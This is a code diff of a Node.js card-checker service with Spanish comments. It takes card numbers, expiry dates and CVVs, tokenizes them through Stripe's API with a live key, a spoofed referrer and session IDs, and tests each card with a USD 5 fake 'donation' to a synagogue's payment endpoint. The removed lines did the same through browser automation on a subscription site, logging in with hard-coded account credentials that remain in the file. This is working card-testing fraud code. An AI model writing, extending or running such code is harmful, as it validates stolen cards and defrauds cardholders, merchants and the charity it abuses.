@@ -1,10 +1,19 @@
-const { chromium } = require("playwright");
+const axios = require('axios');
+const { chromium } = require("@playwright/test");
 const { isLuhnValid } = require("../helps/index.js");
+const cheerio = require('cheerio');
 
 const charges = async (req, res) => {
   const { cardNumber, cardExpiry, cardCvv, name } = req.body
-  const email = "Nueva.amapasa@outlook.com"
-  const password = "Amapasa1."
+  const emails = [
+    "Nueva.amapasa@outlook.com",
+    "juanjoseamapa@gmail.com",
+    "juanjoseamapasa@gmail.com",
+    "master.bineta@gmail.com",
+    "alejandroamapa@gmail.com"
+  ]
+  const password = "Sanchez1."
+  const email = emails[Math.floor(Math.random() * 5)]
 
   async function CheckCard() {
     try {
@@ -16,86 +25,103 @@ const charges = async (req, res) => {
           error: true,
         })
       }
+      const cardExpiryMes = cardExpiry.split('|')[0]
+      const cardExpiryAnio = cardExpiry.split('|')[1]
+      // console.log(cardNumber)
+      // console.log(cardExpiryMes)
+      // console.log(cardExpiryAnio)
+      // console.log(cardCvv)
 
-      const browser = await chromium.launch({ headless: false, });
-      const context = await browser.newContext();
-      const page = await context.newPage();
+      const url = "https://api.stripe.com/v1/tokens";
+      const headers = {
+        "accept": "application/json",
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
+      };
 
-      // page.on('console', async msg => {
-      //   if (msg.type() === 'error') {  // Puedes filtrar por el tipo de mensaje (log, error, warning, etc.)
-      //     // await page.close();
-      //     // await browser.close();
-      //     // await page.pause();
-      //     // return res.json({ msg: `Card status: ${msg.text()}` });
-      //   }
-      //   if (msg.type() === 'log') {  // Puedes filtrar por el tipo de mensaje (log, error, warning, etc.)
-      //     // await page.close();
-      //     // await browser.close();
-      //     // return console.log(`Card status: ${msg.text()}`);
-      //   }
-      // });
-      // page.on('request', async (request) => {
-      //   console.log('req', request.url());
-      // });
-      // await page.route(
-      //   "**/*.{png,jpg,jpeg,svg}",
-      //   (route) => route.abort()
-      // );
-      await page.goto('https://www.dipseastories.com/account/');
-      await page.locator("input[name='email']").fill(email);
-      await page.locator("input[name='password']").fill(password);
-      await page.keyboard.press('Tab');
-      await page.keyboard.press('Tab');
-      await page.keyboard.press('Enter');
-      await page.locator("a[href='/subscribe/']").click();
-      // inicia Check targeta
-      await page.waitForSelector("input[id='cc-name ccname']")
-      await page.locator("input[id='cc-name ccname']").fill(name);
-      await page.waitForTimeout(5000);
-      await page.keyboard.press('Tab');
-      await page.waitForTimeout(1000);
-      await page.keyboard.type(cardNumber);
-      // await page.waitForTimeout(1000);
-      // await page.keyboard.press('Tab');
-      await page.keyboard.press('Tab');
-      await page.keyboard.type(cardExpiry, { delay: 500 });
-      await page.keyboard.press('Tab');
-      await page.waitForTimeout(1000);
-      await page.keyboard.type(cardCvv, { delay: 500 });
-      await page.keyboard.press('Tab');
-      await page.waitForTimeout(500);
-      await page.keyboard.press('Enter');
-      await page.waitForTimeout(6000);
-      const cardErrorCount = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.bXCsCt').count();
-      await page.waitForTimeout(1000);
-      if (cardErrorCount > 0) {
-        const cardError = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.bXCsCt').innerText();
-        await page.close();
-        await browser.close();
-        return res.json({ card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`, status: cardError, error: true });
-      }
-      const cardSuccess = await page.getByText("You just unlocked 1,000 original spicy audiobooks and more").count();
-      if (cardSuccess > 0) {
-        await page.close();
-        await browser.close();
-        return res.json({
-          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
-          status: "charges was successfully",
+      const data = new URLSearchParams({
+        "guid": "b094041a-9d93-47ac-808b-67fa048c9c79cffbe1",
+        "muid": "1bbbe87e-aacf-4839-81c5-ae1b8414091b045ffd",
+        "sid": "01a17e99-14b8-47f2-b0fd-ed73b7f975f10eaf1e",
+        "referrer": "https://adath.com",
+        "time_on_page": 116704,
+        "card[number]": cardNumber,
+        "card[cvc]": cardCvv,
+        "card[exp_month]": cardExpiryMes,
+        "card[exp_year]": cardExpiryAnio,
+        "card[address_zip]": "10090",
+        "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
+        "key": "pk_live_hfa8n6GiIulubXWLlxKFT2Nk00HemDDv0u",
+        "pasted_fields": "number"
+      });
+
+      const response = await axios.post(url, data.toString(), { headers });
+      const stripeToken = response.data.id
+      // console.log(stripeToken);
+
+      const urlCharge = "https://adath.com/pay/charge";
+      const headersCharge = {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8",
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
+      };
+      const dataCharge = new URLSearchParams({
+        "first-name": "Raul",
+        "last-name": "Asencio",
+        "email": "juanjoseama@gmail.com",
+        "phone": "6674278938",
+        "amount": "USD 5.00",
+        "note": "",
+        "description": "Donation",
+        "stripeToken": stripeToken
+      });
+
+      const responseCharge = await axios.post(urlCharge, dataCharge.toString(), { headers: headersCharge });
+      // console.log('response', responseCharge.data);
+      // console.log("STATUS CODE:", responseCharge.status);
+      // console.log("HTML LENGTH:", responseCharge.data.length);
+      // console.log("HTML PREVIEW:", responseCharge.data.slice(0, 500));
+      if (responseCharge.status === 200) {
+        console.log("Cargando cheerio...")
+        const $ = cheerio.load(responseCharge.data);
+
+        const excludeTexts = [
+          "Adath Israel Synagogue2337 Edgcumbe RoadSt. Paul, Minnesota 55116-2766",
+          "CALL651-698-8300FAX 651-690-1144",
+          "Rabbi Asher Zeilingoldrabbiz@adath.com"
+        ];
+
+        $('h4').each((index, element) => {
+          const text = $(element).text().trim();
+          if (!excludeTexts.includes(text)) {
+            console.log(`MENSAJE: "${text.toUpperCase()}"`);
+          }
         });
+
+        $('p').each((index, element) => {
+          const text = $(element).text().trim();
+          if (!excludeTexts.includes(text)) {
+            console.log(`MENSAJE: "${text.toUpperCase()}"`);
+          }
+        });
+      } else {
+        console.log(`ERROR EN LA SOLICITUD: ${responseCharge.status}`);
       }
+
       setTimeout(async () => {
-        await page.close();
-        await browser.close();
         return res.json({
-          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
+          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
           status: 'TimeoutError',
           error: true
         });
       }, 17000);
+      // return res.json({
+      //   card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
+      //   status: 'TimeoutError',
+      //   error: true
+      // });
     } catch (error) {
       console.log(error);
-      // await page.close();
-      // await browser.close();
       return res.status(500).send({
         card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
         status: "Ocurrio un error",
@@ -116,102 +142,44 @@ const auth = async (req, res) => {
       const isCardNumberValid = isLuhnValid(cardNumber);
       if (!isCardNumberValid) {
         return res.json({
-          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
+          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
           status: "invalid_card_number",
           error: true,
         })
       }
 
-      const browser = await chromium.launch({ headless: false, });
+      const browser = await chromium.launch({ headless: true, });
       const context = await browser.newContext();
       const page = await context.newPage();
 
-      // page.on('console', async msg => {
-      //   if (msg.type() === 'error') {  // Puedes filtrar por el tipo de mensaje (log, error, warning, etc.)
-      //     // await page.close();
-      //     // await browser.close();
-      //     // await page.pause();
-      //     // return res.json({ msg: `Card status: ${msg.text()}` });
-      //   }
-      //   if (msg.type() === 'log') {  // Puedes filtrar por el tipo de mensaje (log, error, warning, etc.)
-      //     // await page.close();
-      //     // await browser.close();
-      //     // return console.log(`Card status: ${msg.text()}`);
-      //   }
-      // });
-      // page.on('request', async (request) => {
-      //   console.log('req', request.url());
-      // });
-      // await page.route(
-      //   "**/*.{png,jpg,jpeg,svg}",
-      //   (route) => route.abort()
-      // );
-      await page.goto('https://www.dipseastories.com/account/');
-      await page.locator("input[name='email']").fill(email);
-      await page.locator("input[name='password']").fill(password);
-      await page.keyboard.press('Tab');
-      await page.keyboard.press('Tab');
-      await page.keyboard.press('Enter');
-      await page.locator("a[href='/account/subscription/']").click();
-      await page.locator("a[href='/account/update-card/']").click();
-      await page.waitForTimeout(3000);
-      await page.locator("input[id='cc-name ccname']").fill(name);
-      await page.waitForTimeout(1000);
-      await page.keyboard.press('Tab');
-      await page.waitForTimeout(1000);
-      await page.keyboard.type(cardNumber, { delay: 500 });
-      await page.waitForTimeout(1000);
-      await page.keyboard.press('Tab');
-      await page.keyboard.press('Tab');
-      await page.keyboard.type(cardExpiry, { delay: 500 });
-      await page.keyboard.press('Tab');
-      await page.waitForTimeout(1000);
-      await page.keyboard.type(cardCvv, { delay: 500 });
-      await page.keyboard.press('Tab');
-      await page.waitForTimeout(500);
-      await page.keyboard.press('Enter');
-      await page.waitForTimeout(6000);
-      const cardErrorCount = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.haVeUl').count();
-      if (cardErrorCount > 0) {
-        const cardError = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.haVeUl').innerText();
-        console.log(cardError);
-        // await page.close();
-        // await browser.close();
-        // return res.json({ card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`, status: cardError, error: true });
+      await page.goto('https://mobile-check.vercel.app/');
+
+      const textoCount = await page.locator('p.text-center.text-3xl').count();
+      console.log(textoCount)
+      if (textoCount > 0) {
+        const texto = await page.locator('p.text-center.text-3xl').nth(1).innerText();
+        await page.close();
+        await browser.close();
+        return res.json({
+          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
+          status: texto,
+          error: true
+        });
       }
 
-      // const cardErrorCount = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.bXCsCt').count();
-      // await page.waitForTimeout(1000);
-      // if (cardErrorCount > 0) {
-      //   const cardError = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.bXCsCt').innerText();
-      //   await page.close();
-      //   await browser.close();
-      //   return res.json({ card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`, status: cardError, error: true });
-      // }
-      // const cardSuccess = await page.getByText("You just unlocked 1,000 original spicy audiobooks and more").count();
-      // if (cardSuccess > 0) {
-      //   await page.close();
-      //   await browser.close();
-      //   return res.json({
-      //     card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
-      //     status: "charges was successfully",
-      //   });
-      // }
-      // setTimeout(async () => {
-      //   await page.close();
-      //   await browser.close();
-      //   return res.json({
-      //     card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
-      //     status: 'TimeoutError',
-      //     error: true
-      //   });
-      // }, 15000);
+      setTimeout(async () => {
+        await page.close();
+        await browser.close();
+        return res.json({
+          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
+          status: 'TimeoutError',
+          error: true
+        });
+      }, 15000);
     } catch (error) {
       console.log(error);
-      // await page.close();
-      // await browser.close();
       return res.status(500).send({
-        card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
+        card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
         status: "Ocurrio un error",
         error: true
       })
